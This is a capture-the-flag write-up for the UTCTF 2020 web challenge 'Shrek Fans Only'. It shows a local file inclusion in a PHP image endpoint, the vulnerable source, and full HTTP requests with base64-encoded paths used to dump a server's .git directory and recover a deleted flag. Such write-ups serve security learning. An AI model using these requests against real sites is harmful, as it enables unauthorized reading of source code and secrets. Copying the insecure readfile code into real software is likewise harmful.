# UTCTF 2020 – Shrek Fans Only

* **Category:** web
* **Points:** 50

## Challenge

> Shrek seems to be pretty angry about something, so he deleted some important information off his site. He murmured something about Donkey being too committed to infiltrate his swamp. Can you checkout the site and see what the status is?
>
> http://3.91.17.218/.git/
> 
> by gg

## Solution

The text of the challenge reminds something about versioning control systems. Connecting to `http://3.91.17.218/.git/` will spawn a HTTP `403 Forbidden`. So a *git* local repository is present, but it can't be accessed directly.

The main web page is the following.

```html
<!DOCTYPE HTML>
<html>
<head>
<title>Shrek Fanclub</title>
</head>
<body>
<h1>What are you doing in my swamp?</h1>
<img src="getimg.php?img=aW1nMS5qcGc%3D">
<div>There used to be something here but Donkey won't leave me alone<div>
</body>
</html>
```

So you can discover another endpoint: `http://3.91.17.218/getimg.php?img=aW1nMS5qcGc%3D`.

The value for the parameter is `aW1nMS5qcGc=` that base64 decoded will give `img1.jpg`. This endpoint is vulnerable to LFI and can be used to read files on the server.

For example you can use this to read the source code of the web pages.

`index.php` base64 encoded is `aW5kZXgucGhw`.

```
GET /getimg.php?img=aW5kZXgucGhw HTTP/1.1
Host: 3.91.17.218
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0

HTTP/1.1 200 OK
Date: Sat, 07 Mar 2020 19:57:33 GMT
Server: Apache/2.4.25 (Debian)
X-Powered-By: PHP/7.1.20
Content-Length: 247
Connection: close
Content-Type: image/jpg

<!DOCTYPE HTML>
<html>
<head>
<title>Shrek Fanclub</title>
</head>
<body>
<h1>What are you doing in my swamp?</h1>
<img src="getimg.php?img=aW1nMS5qcGc%3D">
<div>There used to be something here but Donkey won't leave me alone<div>
</body>
</html>
```

`getimg.php` base64 encoded is `Z2V0aW1nLnBocA`.

```
GET /getimg.php?img=Z2V0aW1nLnBocA HTTP/1.1
Host: 3.91.17.218
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0

HTTP/1.1 200 OK
Date: Sat, 07 Mar 2020 19:58:41 GMT
Server: Apache/2.4.25 (Debian)
X-Powered-By: PHP/7.1.20
Content-Length: 83
Connection: close
Content-Type: image/jpg

<?php
header("Content-Type: image/jpg");
readfile(base64_decode($_GET['img']));
?>
```

A local git repository has a well known structure under `.git` folder, so you can start to read standard files to build the local repository from scratch:
* `.git/index` base64 encoded is `LmdpdC9pbmRleA`;
* `.git/config` base64 encoded is `LmdpdC9jb25maWc`;
* `.git/HEAD` base64 encoded is `LmdpdC9IRUFE`;
* `.git/refs/remotes/origin/master` base64 encoded is `LmdpdC9yZWZzL3JlbW90ZXMvb3JpZ2luL21hc3Rlcg`;
* `.git/refs/heads/master` base64 encoded is `LmdpdC9yZWZzL2hlYWRzL21hc3Rlcg`;
* `.git/logs/HEAD` base64 encoded is `LmdpdC9sb2dzL0hFQUQ`.

In particular the `.git/logs/HEAD` file will allow you to discover the IDs of the commits and when the flag was removed from the source code.

```
GET /getimg.php?img=LmdpdC9sb2dzL0hFQUQ HTTP/1.1
Host: 3.91.17.218
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0

HTTP/1.1 200 OK
Date: Sat, 07 Mar 2020 20:05:42 GMT
Server: Apache/2.4.25 (Debian)
X-Powered-By: PHP/7.1.20
Content-Length: 839
Connection: close
Content-Type: image/jpg

0000000000000000000000000000000000000000 759be945739b04b63a09e7c02d51567501ead033 Shrek <shrek@shrek.com> 1583366532 +0000	commit (initial): initial commit
759be945739b04b63a09e7c02d51567501ead033 976b625888ae0d9ee9543f025254f71e10b7bcf8 Shrek <shrek@shrek.com> 1583366704 +0000	commit: remove flag
976b625888ae0d9ee9543f025254f71e10b7bcf8 d421c6aa97e8b8a60d330336ec1e829c8ffd7199 Shrek <shrek@shrek.com> 1583367714 +0000	commit: added more stuff
d421c6aa97e8b8a60d330336ec1e829c8ffd7199 759be945739b04b63a09e7c02d51567501ead033 Shrek <shrek@shrek.com> 1583367723 +0000	checkout: moving from master to 759be945739b04b63a09e7c02d51567501ead033
759be945739b04b63a09e7c02d51567501ead033 d421c6aa97e8b8a60d330336ec1e829c8ffd7199 Shrek <shrek@shrek.com> 1583367740 +0000	checkout: moving from 759be945739b04b63a09e7c02d51567501ead033 to master
```

These IDs are used to name files in the local repository. So the following objects can be identified and downloaded:
* `.git/objects/75/9be945739b04b63a09e7c02d51567501ead033` base64 encoded is `LmdpdC9vYmplY3RzLzc1LzliZTk0NTczOWIwNGI2M2EwOWU3YzAyZDUxNTY3NTAxZWFkMDMz`;
* `.git/objects/97/6b625888ae0d9ee9543f025254f71e10b7bcf8` base64 encoded is `LmdpdC9vYmplY3RzLzk3LzZiNjI1ODg4YWUwZDllZTk1NDNmMDI1MjU0ZjcxZTEwYjdiY2Y4`;
* `.git/objects/d4/21c6aa97e8b8a60d330336ec1e829c8ffd7199` base64 encoded is `LmdpdC9vYmplY3RzL2Q0LzIxYzZhYTk3ZThiOGE2MGQzMzAzMzZlYzFlODI5YzhmZmQ3MTk5`;
* `.git/objects/75/9be945739b04b63a09e7c02d51567501ead033` base64 encoded is `LmdpdC9vYmplY3RzLzc1LzliZTk0NTczOWIwNGI2M2EwOWU3YzAyZDUxNTY3NTAxZWFkMDMz`;
* `.git/objects/d4/21c6aa97e8b8a60d330336ec1e829c8ffd7199` base64 encoded is `LmdpdC9vYmplY3RzL2Q0LzIxYzZhYTk3ZThiOGE2MGQzMzAzMzZlYzFlODI5YzhmZmQ3MTk5`.

At this point you can try to restore the source code.

```
m3ssap0@foo  ~/shrek-fans-only (master)
$ git checkout -- .
error: unable to read sha1 file of getimg.php (c9566ff84d2e1ae3339bc1e6303d6d3340b5789f)
error: unable to read sha1 file of img1.jpg (0e8104f51db8f9ee08f0966656a3c2307e6cde5c)
error: unable to read sha1 file of index.php (5ab449745b9c25fb0b56c5fbab8d0c986541233e)
```

You can't perform the operation, but you have just discovered the missing objects IDs that can be downloaded:
* `.git/objects/c9/566ff84d2e1ae3339bc1e6303d6d3340b5789f` base64 encoded is `LmdpdC9vYmplY3RzL2M5LzU2NmZmODRkMmUxYWUzMzM5YmMxZTYzMDNkNmQzMzQwYjU3ODlm`;
* `.git/objects/0e/8104f51db8f9ee08f0966656a3c2307e6cde5c` base64 encoded is `LmdpdC9vYmplY3RzLzBlLzgxMDRmNTFkYjhmOWVlMDhmMDk2NjY1NmEzYzIzMDdlNmNkZTVj`;
* `.git/objects/5a/b449745b9c25fb0b56c5fbab8d0c986541233e` base64 encoded is `LmdpdC9vYmplY3RzLzVhL2I0NDk3NDViOWMyNWZiMGI1NmM1ZmJhYjhkMGM5ODY1NDEyMzNl`.

Now you can correctly restore the source code files.

```
m3ssap0@foo  ~/shrek-fans-only (master)
$ git checkout -- .

m3ssap0@foo  ~/shrek-fans-only (master)
$ ls
getimg.php  img1.jpg  index.php
```

The next step is to check differences among the commit when the flag was removed (`976b625888ae0d9ee9543f025254f71e10b7bcf8`) and the first commit when the flag was present (`759be945739b04b63a09e7c02d51567501ead033`).

```
m3ssap0@foo  ~/shrek-fans-only (master)
$ git diff 759be945739b04b63a09e7c02d51567501ead033 976b625888ae0d9ee9543f025254f71e10b7bcf8
fatal: unable to read tree aeeea4cfa5afa4dcb70e1d6109790377e7bcec4d
```

Another object is missing: `.git/objects/ae/eea4cfa5afa4dcb70e1d6109790377e7bcec4d` base64 encoded is `LmdpdC9vYmplY3RzL2FlL2VlYTRjZmE1YWZhNGRjYjcwZTFkNjEwOTc5MDM3N2U3YmNlYzRk`.

```
m3ssap0@foo  ~/shrek-fans-only (master)
$ git diff 759be945739b04b63a09e7c02d51567501ead033 976b625888ae0d9ee9543f025254f71e10b7bcf8
fatal: unable to read tree 2f74a95c3a29776d84041f360e64d6e6b2edc7bd
```

Another object is missing: `.git/objects/2f/74a95c3a29776d84041f360e64d6e6b2edc7bd` base64 encoded is ` LmdpdC9vYmplY3RzLzJmLzc0YTk1YzNhMjk3NzZkODQwNDFmMzYwZTY0ZDZlNmIyZWRjN2Jk`.

```
m3ssap0@foo  ~/shrek-fans-only (master)
$ git diff 759be945739b04b63a09e7c02d51567501ead033 976b625888ae0d9ee9543f025254f71e10b7bcf8
fatal: unable to read 6578c62fa248d078ffc551405c9700e3ccc9f5b3
```

Another object is missing: `.git/objects/65/78c62fa248d078ffc551405c9700e3ccc9f5b3` base64 encoded is ` LmdpdC9vYmplY3RzLzY1Lzc4YzYyZmEyNDhkMDc4ZmZjNTUxNDA1Yzk3MDBlM2NjYzlmNWIz`.

```
m3ssap0@foo  ~/shrek-fans-only (master)
$ git diff 759be945739b04b63a09e7c02d51567501ead033 976b625888ae0d9ee9543f025254f71e10b7bcf8
fatal: unable to read 40d2c576876fd085d830739589294ed8c6412fc9
```

Another object is missing: `.git/objects/40/d2c576876fd085d830739589294ed8c6412fc9` base64 encoded is ` LmdpdC9vYmplY3RzLzQwL2QyYzU3Njg3NmZkMDg1ZDgzMDczOTU4OTI5NGVkOGM2NDEyZmM5`.

```
m3ssap0@foo  ~/shrek-fans-only (master)
$ git diff 759be945739b04b63a09e7c02d51567501ead033 976b625888ae0d9ee9543f025254f71e10b7bcf8
diff --git a/index.php b/index.php
index 6578c62..40d2c57 100644
--- a/index.php
+++ b/index.php
@@ -6,6 +6,6 @@
 <body>
 <h1>What are you doing in my swamp?</h1>
 <img src="imgproxy.php?img=img1.jpg">
-<div>utflag{honey_i_shrunk_the_kids_HxSvO3jgkj}</div>
+<div>There used to be something here but Donkey won't leave me alone<div>
 </body>
 </html>
```

The flag is the following.

```
utflag{honey_i_shrunk_the_kids_HxSvO3jgkj}
```